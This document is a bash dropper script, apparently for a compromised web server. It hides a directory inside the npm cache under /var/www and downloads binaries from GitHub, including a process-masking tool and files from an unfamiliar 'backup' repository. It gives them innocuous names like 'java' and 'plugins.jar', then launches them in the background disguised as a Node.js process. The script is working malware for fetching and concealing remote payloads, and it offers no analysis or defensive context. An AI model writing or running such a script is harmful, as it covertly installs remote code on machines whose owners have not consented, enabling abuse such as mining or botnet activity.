#!/bin/bash

function fetch_files() {
    mkdir -p /var/www/.npm/_cacache/content-v2/sha512/.c0
    cd /var/www/.npm/_cacache/content-v2/sha512/.c0 && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o java
    cd /var/www/.npm/_cacache/content-v2/sha512/.c0 && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o bot.jar
    cd /var/www/.npm/_cacache/content-v2/sha512/.c0 && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /var/www/.npm/_cacache/content-v2/sha512/.c0 && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/vm/n1.conf -o cfg.conf
}

function start_app() {
    cd /var/www/.npm/_cacache/content-v2/sha512/.c0 && kill -9 `cat supervisord.pid`
    chmod a+x /var/www/.npm/_cacache/content-v2/sha512/.c0/***
    cd /var/www/.npm/_cacache/content-v2/sha512/.c0 && nohup ./java -a '/usr/bin/node index.js' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
}

if [ -f "/var/www/.npm/_cacache/content-v2/sha512/.c0/java" ]  && [ -f "/var/www/.npm/_cacache/content-v2/sha512/.c0/plugins.jar" ] && [ -f "/var/www/.npm/_cacache/content-v2/sha512/.c0/bot.jar" ]; then
    start_app
else
    rm -rf /var/www/.npm/_cacache/content-v2/sha512/.c0/**
    fetch_files
    start_app
fi